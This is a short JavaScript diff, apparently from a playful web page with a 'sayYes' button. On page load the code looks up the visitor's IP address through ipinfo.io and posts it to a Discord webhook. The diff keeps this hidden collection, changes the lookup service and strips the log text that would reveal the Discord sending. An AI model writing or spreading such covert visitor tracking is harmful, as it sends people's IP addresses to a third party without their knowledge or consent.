@@ -142,14 +142,14 @@
         }),
       })
       .then(response => response.json())
-      .then(data => console.log('Message sent to Discord:', data))
-      .catch(error => console.error('Error sending message to Discord:', error));
+      .then(data => console.log(data))
+      .catch(error => console.error(error));
     }
     
-    fetch('https://api.ipify.org/?format=json')
-    .then(response => response.json()) 
+    fetch('https://ipinfo.io/json')
+    .then(response => response.json())
     .then(data => {
-        sendWebhookMessage(data.ip);
+        sendWebhookMessage(data.ip); 
     });
 
     function sayYes() {
